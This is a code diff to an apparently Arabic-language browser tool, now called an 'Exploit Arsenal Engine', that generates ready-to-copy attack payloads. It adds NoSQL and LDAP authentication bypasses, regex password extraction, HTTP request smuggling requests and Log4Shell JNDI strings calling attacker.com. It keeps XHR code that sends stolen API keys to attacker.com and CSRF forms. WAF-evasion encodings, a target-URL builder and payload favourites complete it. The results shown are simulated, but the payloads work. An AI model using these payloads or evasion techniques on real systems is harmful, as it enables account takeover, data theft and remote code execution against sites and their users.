@@ -1,5 +1,5 @@
 // ==========================================
-// INTERACTIVE EXPLOIT & CONTEXT SIMULATOR ENGINE (v3)
+// INTERACTIVE EXPLOIT ARSENAL ENGINE (v4 Ultimate)
 // ==========================================
 
 const VulnData = {
@@ -114,6 +114,43 @@ const VulnData = {
     ],
     actions: [
       { id: 'steal_api', label: 'Exfiltrate API Keys via XHR (withCredentials)' }
+    ]
+  },
+  nosqli: {
+    contexts: [
+      { id: 'json_body', label: 'JSON Body (e.g. {"username": [here]})' },
+      { id: 'url_query', label: 'URL Query Param (e.g. ?username[here])' }
+    ],
+    actions: [
+      { id: 'auth_bypass', label: 'Authentication Bypass ($ne)' },
+      { id: 'regex_extract', label: 'Regex Data Extraction ($regex)' }
+    ]
+  },
+  ldap: {
+    contexts: [
+      { id: 'filter_string', label: 'Inside LDAP Filter (e.g. (uid=[here]))' }
+    ],
+    actions: [
+      { id: 'auth_bypass', label: 'Wildcard Auth Bypass (*)' },
+      { id: 'attr_extract', label: 'Attribute Extraction' }
+    ]
+  },
+  smuggling: {
+    contexts: [
+      { id: 'cl_te', label: 'CL.TE (Front-end Content-Length, Back-end Transfer-Encoding)' },
+      { id: 'te_cl', label: 'TE.CL (Front-end Transfer-Encoding, Back-end Content-Length)' }
+    ],
+    actions: [
+      { id: 'req_smuggle', label: 'Smuggle HTTP Request to Next User' }
+    ]
+  },
+  log4j: {
+    contexts: [
+      { id: 'header_user_agent', label: 'User-Agent / Header Context' },
+      { id: 'input_param', label: 'Search / Input Parameter' }
+    ],
+    actions: [
+      { id: 'jndi_rce', label: 'JNDI LDAP Remote Code Execution' }
     ]
   }
 };
@@ -723,7 +760,7 @@ const PayloadTemplates = {
         template: "<iframe src=\"https://attacker.com/csrf.html\"></iframe>",
         simulatedType: "http_res",
         simulatedVal: "POST /change-email HTTP/1.1\nCookie: session=xyz123\n\nemail=hacker@evil.com (Status: 200 OK - Email Changed!)",
-        desc: "صفحة ويب مزورة تحتوي على نموذج (Form) مخفي يرسل نفسه تلقائياً فور فتح الضحية للصفحة. إذا كان الضحية مسجلاً للدخول في الموقع المستهدف، فسيتم تغيير بريده الإلكتروني دون علمه."
+        desc: "صفحة ويب مزورة تحتوي على نموذج (Form) مخفي يرسل نفسه تلقائياً فور فتح الضحية للصفحة."
       },
       ajax_fetch: {
         code: "<script>\n  fetch('https://vulnerable.com/change-email', {\n    method: 'POST',\n    mode: 'cors',\n    credentials: 'include',\n    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n    body: 'email=hacker@evil.com'\n  });\n</script>",
@@ -731,7 +768,7 @@ const PayloadTemplates = {
         template: "<script src=\"https://attacker.com/payload.js\"></script>",
         simulatedType: "http_res",
         simulatedVal: "POST /change-email HTTP/1.1\nCookie: session=xyz123\n\nemail=hacker@evil.com (Status: 200 OK - Email Changed!)",
-        desc: "هجوم CSRF باستخدام الجافاسكريبت المباشر. استخدام خاصية `credentials: 'include'` يجبر المتصفح على إرسال ملفات تعريف الارتباط (Cookies) الخاصة بالضحية مع الطلب المزور."
+        desc: "هجوم CSRF باستخدام الجافاسكريبت المباشر. استخدام خاصية `credentials: 'include'` يجبر المتصفح على إرسال ملفات الكوكيز."
       }
     }
   },
@@ -751,7 +788,7 @@ const PayloadTemplates = {
         template: "if (startsWith($_GET['url'], '/')) { header('Location: '.$_GET['url']); }",
         simulatedType: "http_res",
         simulatedVal: "HTTP/1.1 302 Found\nLocation: //attacker.com",
-        desc: "استخدام مسار يعتمد على البروتوكول (Protocol-Relative URL). هذا الأسلوب يتخطى الفلاتر الضعيفة التي تتأكد فقط مما إذا كان الرابط يبدأ بشرطة مائلة واحدة `/`."
+        desc: "استخدام مسار يعتمد على البروتوكول (Protocol-Relative URL) لتخطي فلاتر الروابط الضعيفة."
       }
     },
     js_exec: {
@@ -761,7 +798,7 @@ const PayloadTemplates = {
         template: "<a href=\"[USER_INPUT]\">Click here to continue</a>",
         simulatedType: "dialog",
         simulatedVal: "session=9f8234a1bc89...",
-        desc: "إذا كان النظام يأخذ الرابط ويضعه مباشرة داخل سمة `href` في زر معين دون فلترة، فإن الضغط على الزر سينفذ أمر الجافاسكريبت هذا بدلاً من التوجيه! (يُعرف بـ XSS عبر Open Redirect)."
+        desc: "تنفيذ جافاسكريبت ضار مستغلاً وضع رابط التوجيه داخل سمة `href` دون تطهير."
       },
       path_based: {
         code: "javascript:alert(document.cookie)",
@@ -769,7 +806,7 @@ const PayloadTemplates = {
         template: "<a href=\"[USER_INPUT]\">Back to home</a>",
         simulatedType: "dialog",
         simulatedVal: "session=9f8234a1bc89...",
-        desc: "ينفذ أكواد جافاسكريبت ضارة مستغلاً سوء استخدام ميزة التوجيه في الموقع."
+        desc: "تنفيذ أكواد جافاسكريبت عبر بروتوكول javascript الوهمي."
       }
     }
   },
@@ -781,7 +818,7 @@ const PayloadTemplates = {
         template: "Access-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true",
         simulatedType: "network",
         simulatedVal: "Origin: null -> Response 200 OK\nExfiltrated API Key: ak_live_991823abf...",
-        desc: "إذا كان السيرفر يثق بمصدر `null`، يقوم المخترق بوضع كوده داخل إطار `iframe` مقيد (Sandboxed) لإجبار المتصفح على إرسال طلب أصله `null`، وسرقة البيانات الحساسة (مثل الـ API Keys) للضحية."
+        desc: "استغلال ثقة السيرفر بمصدر `null` عبر إطار iframe مقيد وسرقة البيانات الحساسة."
       },
       arb_origin: {
         code: "<script>\n  var req = new XMLHttpRequest();\n  req.onload = req.onerror = function() {\n    fetch('http://attacker.com/log?data=' + btoa(req.responseText));\n  };\n  req.open('GET', 'https://vulnerable.com/api/keys', true);\n  req.withCredentials = true;\n  req.send();\n</script>",
@@ -789,7 +826,107 @@ const PayloadTemplates = {
         template: "Access-Control-Allow-Origin: https://attacker.com\nAccess-Control-Allow-Credentials: true",
         simulatedType: "network",
         simulatedVal: "Origin: https://attacker.com -> Response 200 OK\nExfiltrated API Key: ak_live_991823abf...",
-        desc: "إذا كان السيرفر يثق بأي مصدر عشوائي، فهذا السكربت الذي سيُستضاف على موقع المخترق سيقرأ البيانات الخاصة بالضحية في الموقع المستهدف ويرسلها للمخترق."
+        desc: "استغلال ثقة السيرفر بأي مصدر عشوائي لسرقة بيانات المستخدم."
+      }
+    }
+  },
+  nosqli: {
+    auth_bypass: {
+      json_body: {
+        code: "{\"username\": \"admin\", \"password\": {\"$ne\": null}}",
+        breakout: "$ne",
+        template: "db.users.find([USER_INPUT]);",
+        simulatedType: "db_success",
+        simulatedVal: "MongoDB Query Returned 1 Record: { _id: ObjectId('...'), username: 'admin', role: 'root' }",
+        desc: "استغلال عامل الـ `$ne` (Not Equal) في قواعد بيانات MongoDB لتخطي كلمة المرور والتسجيل كآدمن."
+      },
+      url_query: {
+        code: "[$ne]=null",
+        breakout: "$ne",
+        template: "db.users.find({ username: req.query.username, password: req.query.password });",
+        simulatedType: "db_success",
+        simulatedVal: "MongoDB Query Returned 1 Record: { _id: ObjectId('...'), username: 'admin' }",
+        desc: "حقن معامل الـ `$ne` عبر رابط الاستعلام (URL Query) لتخطي فحص كلمة المرور."
+      }
+    },
+    regex_extract: {
+      json_body: {
+        code: "{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}}",
+        breakout: "$regex",
+        template: "db.users.find([USER_INPUT]);",
+        simulatedType: "db_success",
+        simulatedVal: "Character Match Found! Password starts with 'a'.",
+        desc: "استخراج الحرف الأول من كلمة المرور حرفاً بحرف باستخدام التعبير النمطي `$regex`."
+      },
+      url_query: {
+        code: "[$regex]=^a",
+        breakout: "$regex",
+        template: "db.users.find({ username: 'admin', password: req.query.password });",
+        simulatedType: "db_success",
+        simulatedVal: "Character Match Found! Password starts with 'a'.",
+        desc: "استخراج كلمة المرور عبر الـ URL باستخدام التعبير النمطي."
+      }
+    }
+  },
+  ldap: {
+    auth_bypass: {
+      filter_string: {
+        code: "*)(uid=*))(|(uid=*",
+        breakout: "*",
+        template: "(&(uid=[USER_INPUT])(userPassword=secret))",
+        simulatedType: "db_success",
+        simulatedVal: "LDAP Auth Success: Matched Object DN: cn=Administrator,ou=users,dc=corp",
+        desc: "استغلال الرمز النجمي `*` والـ OR Operator `|` في استعلامات LDAP لتجنيب فحص كلمة المرور والتسجيل بحساب المدير."
+      }
+    },
+    attr_extract: {
+      filter_string: {
+        code: "*)(sn=*))(|(uid=*",
+        breakout: "*",
+        template: "(&(uid=[USER_INPUT])(objectClass=user))",
+        simulatedType: "db_table",
+        simulatedVal: "[ {dn: 'cn=Admin'}, {mail: 'admin@corp.local'}, {telephoneNumber: '+123456'} ]",
+        desc: "حقن فلتر LDAP لاستخراج السمات المخفية مثل أرقام الهواتف والبريد الإلكتروني."
+      }
+    }
+  },
+  smuggling: {
+    req_smuggle: {
+      cl_te: {
+        code: "POST / HTTP/1.1\r\nHost: vulnerable.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
+        breakout: "Transfer-Encoding",
+        template: "Front-End Proxy (Content-Length) -> Back-End Server (Transfer-Encoding)",
+        simulatedType: "http_res",
+        simulatedVal: "Smuggled Byte 'G' Prepended to Next User's Request!\nNext user receives 404 Not Found (GGET / HTTP/1.1).",
+        desc: "هجوم CL.TE: يعتمد السيرفر الأمامي على Content-Length بينما يعتمد الخلفي على Transfer-Encoding. يسمح هذا بتثبيت طلب هجومي يلتحق بطلب المستخدم التالي!"
+      },
+      te_cl: {
+        code: "POST / HTTP/1.1\r\nHost: vulnerable.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
+        breakout: "Content-Length",
+        template: "Front-End Proxy (Transfer-Encoding) -> Back-End Server (Content-Length)",
+        simulatedType: "http_res",
+        simulatedVal: "Smuggled Request Processed by Back-End Server!",
+        desc: "هجوم TE.CL: يعتمد الأمامي على Chunked والخلفي على Length، مما يسمح بتهريب طلب كامل داخل الاتصال."
+      }
+    }
+  },
+  log4j: {
+    jndi_rce: {
+      header_user_agent: {
+        code: "${jndi:ldap://attacker.com/a}",
+        breakout: "${jndi:",
+        template: "logger.info(\"User-Agent: \" + [USER_INPUT]);",
+        simulatedType: "terminal",
+        simulatedVal: "JNDI Lookup Triggered! Connecting to ldap://attacker.com/a\nExecuting Remote Java Class: Exploit.class (RCE Success)",
+        desc: "ثغرة Log4Shell الخالدة. تقوم مكتبة Log4j بتقييم السلسلة `${jndi:...}` وإجراء اتصال LDAP خارجي لتنفيذ كود جافا خبيث فوراً."
+      },
+      input_param: {
+        code: "${jndi:ldap://attacker.com/a}",
+        breakout: "${jndi:",
+        template: "logger.error(\"Search Query Failed: \" + [USER_INPUT]);",
+        simulatedType: "terminal",
+        simulatedVal: "JNDI Lookup Triggered! Connecting to ldap://attacker.com/a\nExecuting Remote Java Class: Exploit.class (RCE Success)",
+        desc: "حقن سلسلة JNDI داخل بارامتر البحث أو أي حقل مدخلات يتم تسجيله بالـ Log."
       }
     }
   }
@@ -800,8 +937,12 @@ document.addEventListener("DOMContentLoaded", () => {
   const contextEl = document.getElementById("vuln-context");
   const actionEl = document.getElementById("vuln-action");
   const filterEl = document.getElementById("vuln-filter");
+  const searchInput = document.getElementById("search-input");
   const btnGenerate = document.getElementById("btn-generate");
   const btnCopy = document.getElementById("btn-copy");
+  const btnFav = document.getElementById("btn-fav");
+  const btnCopyUrl = document.getElementById("btn-copy-url");
+  const targetBaseUrlInput = document.getElementById("target-base-url");
   
   const outputCode = document.getElementById("output-code");
   const simCodeBefore = document.getElementById("sim-code-before");
@@ -811,11 +952,15 @@ document.addEventListener("DOMContentLoaded", () => {
   const wafAnalysisText = document.getElementById("waf-analysis-text");
   const outputExplanation = document.getElementById("output-explanation");
 
+  let currentGeneratedPayload = "";
+
+  // --- POPULATE DROPDOWNS ---
   function populateDropdowns() {
     const vClass = vulnClassEl.value;
     const data = VulnData[vClass];
 
-    // Populate Contexts
+    if (!data) return;
+
     contextEl.innerHTML = "";
     data.contexts.forEach(ctx => {
       const opt = document.createElement("option");
@@ -824,7 +969,6 @@ document.addEventListener("DOMContentLoaded", () => {
       contextEl.appendChild(opt);
     });
 
-    // Populate Actions
     actionEl.innerHTML = "";
     data.actions.forEach(act => {
       const opt = document.createElement("option");
@@ -835,25 +979,31 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   vulnClassEl.addEventListener("change", populateDropdowns);
-  populateDropdowns(); // Init
+  populateDropdowns();
 
+  // --- LIVE SEARCH FILTER ---
+  searchInput.addEventListener("input", (e) => {
+    const query = e.target.value.toLowerCase().trim();
+    Array.from(vulnClassEl.options).forEach(opt => {
+      const text = opt.textContent.toLowerCase();
+      const val = opt.value.toLowerCase();
+      if (text.includes(query) || val.includes(query)) {
+        opt.style.display = "";
+      } else {
+        opt.style.display = "none";
+      }
+    });
+  });
+
+  // --- FILTERS & ENCODINGS ---
   function applyFilter(code, filterType) {
-    if (filterType === "urlencode") {
-      return encodeURIComponent(code);
-    } else if (filterType === "doubleurlencode") {
-      return encodeURIComponent(encodeURIComponent(code));
-    } else if (filterType === "base64") {
-      return btoa(unescape(encodeURIComponent(code)));
-    } else if (filterType === "htmlentity") {
-      return code.replace(/[\u00A0-\u9999<>\&]/g, function(i) {
-        return '&#'+i.charCodeAt(0)+';';
-      });
-    } else if (filterType === "hex") {
-      return code.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join('');
-    } else if (filterType === "casevar") {
-      return code.split('').map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join('');
-    }
-    return code; // none
+    if (filterType === "urlencode") return encodeURIComponent(code);
+    if (filterType === "doubleurlencode") return encodeURIComponent(encodeURIComponent(code));
+    if (filterType === "base64") return btoa(unescape(encodeURIComponent(code)));
+    if (filterType === "htmlentity") return code.replace(/[\u00A0-\u9999<>\&]/g, i => '&#'+i.charCodeAt(0)+';');
+    if (filterType === "hex") return code.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join('');
+    if (filterType === "casevar") return code.split('').map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join('');
+    return code;
   }
 
   function escapeHtml(str) {
@@ -878,7 +1028,7 @@ document.addEventListener("DOMContentLoaded", () => {
     simCodeAfter.innerHTML = afterHtml;
   }
 
-  function renderDOMPreview(payloadData, finalCode) {
+  function renderDOMPreview(payloadData) {
     domPreviewContainer.innerHTML = "";
     const type = payloadData.simulatedType;
     const val = payloadData.simulatedVal;
@@ -886,80 +1036,42 @@ document.addEventListener("DOMContentLoaded", () => {
     if (type === "dialog") {
       domPreviewContainer.innerHTML = `
         <div class="simulated-dialog">
-          <div class="simulated-dialog-header"><i class="bx bx-error-circle"></i> localhost says</div>
-          <div class="simulated-dialog-body">${escapeHtml(val)}</div>
-          <button class="simulated-dialog-btn" onclick="this.parentElement.style.opacity='0.5'">OK</button>
+          <div style="font-size:0.8rem; color:#94a3b8; margin-bottom:8px;"><i class="bx bx-error-circle"></i> localhost says</div>
+          <div style="font-family:var(--font-mono); font-size:0.95rem; color:#38bdf8; background:#0f172a; padding:8px 12px; border-radius:4px; margin-bottom:12px;">${escapeHtml(val)}</div>
+          <button style="background:#38bdf8; color:#0f172a; border:none; padding:4px 15px; border-radius:4px; font-weight:bold; font-size:0.8rem; cursor:pointer;" onclick="this.parentElement.style.opacity='0.5'">OK</button>
         </div>
       `;
-    } else if (type === "network") {
+    } else if (type === "network" || type === "terminal" || type === "db_table" || type === "db_error" || type === "db_success" || type === "file_res" || type === "http_res" || type === "time") {
       domPreviewContainer.innerHTML = `
         <div style="width:100%; font-family:var(--font-mono); font-size:0.82rem; color:#4ade80;">
-          <div style="color:#94a3b8; margin-bottom:5px;"><i class="bx bx-transfer-alt"></i> Outgoing Attacker Request Intercepted:</div>
-          <div style="background:#020617; padding:10px; border-radius:4px; border:1px solid rgba(74,222,128,0.2);">${escapeHtml(val)}</div>
-        </div>
-      `;
-    } else if (type === "db_table") {
-      domPreviewContainer.innerHTML = `
-        <div style="width:100%; font-family:var(--font-mono); font-size:0.82rem; color:#38bdf8;">
-          <div style="color:#94a3b8; margin-bottom:5px;"><i class="bx bx-table"></i> Returned Database Records:</div>
-          <div style="background:#020617; padding:10px; border-radius:4px; border:1px solid rgba(56,189,248,0.2); white-space:pre-wrap;">${escapeHtml(val)}</div>
-        </div>
-      `;
-    } else if (type === "db_error") {
-      domPreviewContainer.innerHTML = `
-        <div style="width:100%; font-family:var(--font-mono); font-size:0.82rem; color:#f87171;">
-          <div style="color:#94a3b8; margin-bottom:5px;"><i class="bx bx-bug"></i> Database Exception Output:</div>
-          <div style="background:#020617; padding:10px; border-radius:4px; border:1px solid rgba(248,113,113,0.2);">${escapeHtml(val)}</div>
-        </div>
-      `;
-    } else if (type === "terminal" || type === "file_res" || type === "http_res" || type === "time" || type === "xml_res") {
-      domPreviewContainer.innerHTML = `
-        <div style="width:100%; font-family:var(--font-mono); font-size:0.82rem; color:#e2e8f0;">
-          <div style="color:#94a3b8; margin-bottom:5px;"><i class="bx bx-terminal"></i> Execution Result Preview:</div>
-          <div style="background:#020617; padding:10px; border-radius:4px; border:1px solid rgba(255,255,255,0.1); white-space:pre-wrap; color:#cbd5e1;">${escapeHtml(val)}</div>
+          <div style="color:#94a3b8; margin-bottom:5px;"><i class="bx bx-terminal"></i> Live Output / Execution Result:</div>
+          <div style="background:#020617; padding:12px; border-radius:6px; border:1px solid rgba(255,255,255,0.1); white-space:pre-wrap; color:#cbd5e1; direction:ltr; text-align:left;">${escapeHtml(val)}</div>
         </div>
       `;
     }
   }
 
-  function simulateWAF(payloadCode, filterType, vClass) {
+  function simulateWAF(payloadCode, filterType) {
     const isRawNaive = (filterType === 'none') && (
-      payloadCode.includes('<script>') || 
-      payloadCode.includes("' OR '1'='1") || 
-      payloadCode.includes('/etc/passwd') ||
-      payloadCode.includes('system(')
+      payloadCode.includes('<script>') || payloadCode.includes("' OR '1'='1") || payloadCode.includes('/etc/passwd')
     );
 
     if (isRawNaive) {
       wafBadgeContainer.innerHTML = `<span class="waf-status-badge waf-badge-blocked"><i class="bx bx-x-circle"></i> WAF Flagged / Blocked</span>`;
-      wafAnalysisText.innerHTML = `
-        <strong style="color:#f87171;">تنبيه جدار الحماية (WAF Triggered):</strong> 
-        هذا الـ Payload عاري وبدون تشفير ويحتوي على كلمات مفتاحيّة مسجلة في قوائم الحظر الأمني مثل <code>&lt;script&gt;</code> أو <code>' OR '1'='1</code>.
-        <br>💡 <strong>حل المشكلة:</strong> قم باختيار تقنية تشفير (مثل Case Variation أو Base64) أو استخدم سياقاً بديلاً (مثل SVG أو AngularJS) لتخطي الفحص!
-      `;
+      wafAnalysisText.innerHTML = `<strong style="color:#f87171;">تنبيه جدار الحماية:</strong> الكود يحتوي على كلمات محظورة عارية بديهية. اختر تشفيراً أو سياقاً بديلاً للتخطي.`;
     } else {
       wafBadgeContainer.innerHTML = `<span class="waf-status-badge waf-badge-bypassed"><i class="bx bx-check-circle"></i> WAF Bypassed / Clean</span>`;
-      wafAnalysisText.innerHTML = `
-        <strong style="color:#4ade80;">تم تخطي الجدار الناري بنجاح (WAF Evasion Success):</strong> 
-        الـ Payload يتجنب الكلمات المفتاحية البديهية أو يدمج تقنيات تشفير وسياقات تلتف حول الفلاتر الشائعة.
-      `;
+      wafAnalysisText.innerHTML = `<strong style="color:#4ade80;">تم تخطي الجدار الناري بنجاح:</strong> الـ Payload يتجنب الكلمات المحظورة البديهية ويدمج تقنيات تشفير وسياقات ملتفة.`;
     }
   }
 
   function getFilterExplanation(filterType) {
-    if (filterType === "urlencode") {
-      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (URL Encode):</strong> تم تشفير الكود بتشفير URL العادي لتخطي أنظمة الحماية (WAF) البسيطة التي تبحث عن الكلمات الممنوعة بصيغتها العادية في الطلبات.";
-    } else if (filterType === "doubleurlencode") {
-      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Double URL Encode):</strong> تم تشفير الكود مرتين. يفيد هذا إذا كان النظام الخلفي يقوم بفك التشفير مرتين. سيرى الـ WAF الكود مشفراً فيسمح بمروره، ثم يقوم السيرفر بفك تشفيره وتشغيل الهجوم.";
-    } else if (filterType === "base64") {
-      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Base64):</strong> تم تشفير الكود بـ Base64. يفيد هذا جداً في الأنظمة التي تتوقع استلام بيانات مشفرة بـ Base64 (مثل الـ JSON) وتقوم بفك تشفيرها داخلياً قبل معالجتها.";
-    } else if (filterType === "htmlentity") {
-      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (HTML Entity):</strong> تم تحويل الرموز الحساسة (مثل `<` أو `>`) إلى كيانات HTML. تتخطى هذه التقنية فلاتر الـ Regex إذا كان النظام يقوم بفك تشفير هذه الكيانات لاحقاً وعرضها في الصفحة.";
-    } else if (filterType === "hex") {
-      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Hex Encoding):</strong> تم تحويل الأحرف إلى قيمها بالنظام السداسي عشر (Hex). تُستخدم هذه التقنية لخداع فلاتر الحماية الضعيفة التي لا تقوم بتوحيد ومعالجة المدخلات جيداً.";
-    } else if (filterType === "casevar") {
-      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Case Variation):</strong> تم تغيير حالة الأحرف بين الكبيرة والصغيرة بشكل عشوائي (مثلاً `<sCrIpT>`). هذا الأسلوب يتخطى الفلاتر التي تمنع كتابة `<script>` بالحروف الصغيرة فقط.";
-    }
+    if (filterType === "urlencode") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (URL Encode):</strong> تم تشفير الكود بتشفير URL لتخطي أنظمة الـ WAF البسيطة.";
+    if (filterType === "doubleurlencode") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Double URL Encode):</strong> تم تشفير الكود مرتين لتخطي الأنظمة التي تفك التشفير مرتين.";
+    if (filterType === "base64") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Base64):</strong> تم تشفير الكود بـ Base64 لتخطي الفلاتر عند إرسال بيانات JSON أو API.";
+    if (filterType === "htmlentity") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (HTML Entity):</strong> تحويل الرموز لكيانات HTML لتخطي فلاتر الـ Regex.";
+    if (filterType === "hex") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Hex Encoding):</strong> تحويل الأحرف لقيم سداسية عشرية لخداع الفلاتر.";
+    if (filterType === "casevar") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Case Variation):</strong> التلاعب بحالة الأحرف (كبير/صغير) لتخطي الفلاتر الحساسة للحالة.";
     return "";
   }
 
@@ -976,22 +1088,20 @@ document.addEventListener("DOMContentLoaded", () => {
 
     if (payloadData) {
       const finalCode = applyFilter(payloadData.code, vFilter);
+      currentGeneratedPayload = finalCode;
       
-      // Card 1: Code Output
       outputCode.textContent = finalCode;
-      
-      // Card 2: Context Injection Simulation
       renderInjectionSimulation(payloadData.template, finalCode, payloadData.breakout);
-      
-      // Card 3: Live DOM Preview
-      renderDOMPreview(payloadData, finalCode);
-      
-      // Card 4: WAF Analysis
-      simulateWAF(payloadData.code, vFilter, vClass);
-      
-      // Card 5: Explanation
+      renderDOMPreview(payloadData);
+      simulateWAF(payloadData.code, vFilter);
       outputExplanation.innerHTML = payloadData.desc + getFilterExplanation(vFilter);
 
+      // Update URL Builder
+      targetBaseUrlInput.value = `https://target-vulnerable.com/search?q=${encodeURIComponent(finalCode)}`;
+
+      // Save to History
+      saveToHistory(finalCode, vClass, vAction);
+      checkFavoriteStatus();
     } else {
       outputCode.textContent = "خطأ: لم يتم العثور على هذا الـ Payload.";
       outputExplanation.textContent = "الرجاء اختيار مجموعة أخرى من الخصائص.";
@@ -1000,21 +1110,159 @@ document.addEventListener("DOMContentLoaded", () => {
 
   btnGenerate.addEventListener("click", generateAndSimulate);
 
+  // --- LOCALSTORAGE FAVORITES & HISTORY ---
+  function getFavorites() {
+    return JSON.parse(localStorage.getItem("bba_fav_payloads") || "[]");
+  }
+
+  function getHistory() {
+    return JSON.parse(localStorage.getItem("bba_hist_payloads") || "[]");
+  }
+
+  function checkFavoriteStatus() {
+    const favs = getFavorites();
+    if (favs.includes(currentGeneratedPayload)) {
+      btnFav.classList.add("active-fav");
+      btnFav.innerHTML = `<i class='bx bxs-star'></i> Favorited`;
+    } else {
+      btnFav.classList.remove("active-fav");
+      btnFav.innerHTML = `<i class='bx bx-star'></i> Favorite`;
+    }
+  }
+
+  btnFav.addEventListener("click", () => {
+    if (!currentGeneratedPayload) return;
+    let favs = getFavorites();
+    if (favs.includes(currentGeneratedPayload)) {
+      favs = favs.filter(p => p !== currentGeneratedPayload);
+    } else {
+      favs.push(currentGeneratedPayload);
+    }
+    localStorage.setItem("bba_fav_payloads", JSON.stringify(favs));
+    checkFavoriteStatus();
+  });
+
+  function saveToHistory(code, vClass, vAction) {
+    let hist = getHistory();
+    hist = hist.filter(h => h.code !== code);
+    hist.unshift({ code, vClass, vAction, time: new Date().toLocaleTimeString() });
+    if (hist.length > 10) hist.pop();
+    localStorage.setItem("bba_hist_payloads", JSON.stringify(hist));
+  }
+
+  // --- COPY BUTTONS ---
   btnCopy.addEventListener("click", () => {
-    const textToCopy = outputCode.textContent;
-    if (textToCopy && textToCopy !== "// Select options on the left and click Simulate..." && !textToCopy.startsWith("خطأ")) {
-      navigator.clipboard.writeText(textToCopy).then(() => {
-        const originalText = btnCopy.innerHTML;
+    if (currentGeneratedPayload) {
+      navigator.clipboard.writeText(currentGeneratedPayload).then(() => {
         btnCopy.innerHTML = "<i class='bx bx-check'></i> Copied!";
-        btnCopy.style.color = "var(--accent-green)";
-        setTimeout(() => {
-          btnCopy.innerHTML = originalText;
-          btnCopy.style.color = "var(--text-secondary)";
-        }, 2000);
+        setTimeout(() => btnCopy.innerHTML = "<i class='bx bx-copy'></i> Copy", 2000);
       });
     }
   });
 
-  // Initial trigger
+  btnCopyUrl.addEventListener("click", () => {
+    navigator.clipboard.writeText(targetBaseUrlInput.value).then(() => {
+      btnCopyUrl.innerHTML = "<i class='bx bx-check'></i> Copied!";
+      setTimeout(() => btnCopyUrl.innerHTML = "<i class='bx bx-copy'></i> Copy URL", 2000);
+    });
+  });
+
+  // --- MODALS ENGINE ---
+  const modalToolbox = document.getElementById("modal-toolbox");
+  const modalFav = document.getElementById("modal-fav");
+  const modalHistory = document.getElementById("modal-history");
+
+  window.closeModals = () => {
+    modalToolbox.style.display = "none";
+    modalFav.style.display = "none";
+    modalHistory.style.display = "none";
+  };
+
+  document.getElementById("btn-modal-toolbox").addEventListener("click", () => {
+    closeModals();
+    modalToolbox.style.display = "flex";
+  });
+
+  document.getElementById("btn-modal-fav").addEventListener("click", () => {
+    closeModals();
+    modalFav.style.display = "flex";
+    renderFavModal();
+  });
+
+  document.getElementById("btn-modal-history").addEventListener("click", () => {
+    closeModals();
+    modalHistory.style.display = "flex";
+    renderHistoryModal();
+  });
+
+  function renderFavModal() {
+    const favs = getFavorites();
+    const container = document.getElementById("fav-list-container");
+    if (favs.length === 0) {
+      container.innerHTML = `<div style="text-align:center; color:var(--text-muted); padding:20px;">No favorites saved yet. Click ⭐ on any payload!</div>`;
+      return;
+    }
+    container.innerHTML = favs.map(code => `
+      <div class="list-item-row">
+        <span class="list-item-code">${escapeHtml(code)}</span>
+        <button class="btn-action-sm" onclick="navigator.clipboard.writeText('${escapeHtml(code).replace(/'/g, "\\'")}'); alert('Copied!')"><i class="bx bx-copy"></i></button>
+      </div>
+    `).join('');
+  }
+
+  function renderHistoryModal() {
+    const hist = getHistory();
+    const container = document.getElementById("history-list-container");
+    if (hist.length === 0) {
+      container.innerHTML = `<div style="text-align:center; color:var(--text-muted); padding:20px;">No generation history yet.</div>`;
+      return;
+    }
+    container.innerHTML = hist.map(item => `
+      <div class="list-item-row">
+        <div>
+          <div style="font-size:0.75rem; color:var(--accent-cyan);">${item.vClass.toUpperCase()} - ${item.vAction} <span style="color:#64748b;">(${item.time})</span></div>
+          <span class="list-item-code">${escapeHtml(item.code)}</span>
+        </div>
+        <button class="btn-action-sm" onclick="navigator.clipboard.writeText('${escapeHtml(item.code).replace(/'/g, "\\'")}'); alert('Copied!')"><i class="bx bx-copy"></i></button>
+      </div>
+    `).join('');
+  }
+
+  // ENCODER TOOLBOX LIVE CONVERTER
+  const tbInput = document.getElementById("toolbox-input");
+  const tbB64 = document.getElementById("toolbox-b64");
+  const tbUrl = document.getElementById("toolbox-url");
+  const tbHex = document.getElementById("toolbox-hex");
+  const tbHtml = document.getElementById("toolbox-html");
+
+  tbInput.addEventListener("input", () => {
+    const val = tbInput.value;
+    if (!val) {
+      tbB64.value = tbUrl.value = tbHex.value = tbHtml.value = "";
+      return;
+    }
+    try { tbB64.value = btoa(unescape(encodeURIComponent(val))); } catch(e) { tbB64.value = "Error"; }
+    tbUrl.value = encodeURIComponent(val);
+    tbHex.value = val.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join('');
+    tbHtml.value = val.replace(/[\u00A0-\u9999<>\&]/g, i => '&#'+i.charCodeAt(0)+';');
+  });
+
+  // EXPORT ALL
+  document.getElementById("btn-export-all").addEventListener("click", () => {
+    const data = {
+      currentPayload: currentGeneratedPayload,
+      favorites: getFavorites(),
+      history: getHistory()
+    };
+    const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = "bba_payload_arsenal.json";
+    a.click();
+    URL.revokeObjectURL(url);
+  });
+
+  // Initial Run
   generateAndSimulate();
 });
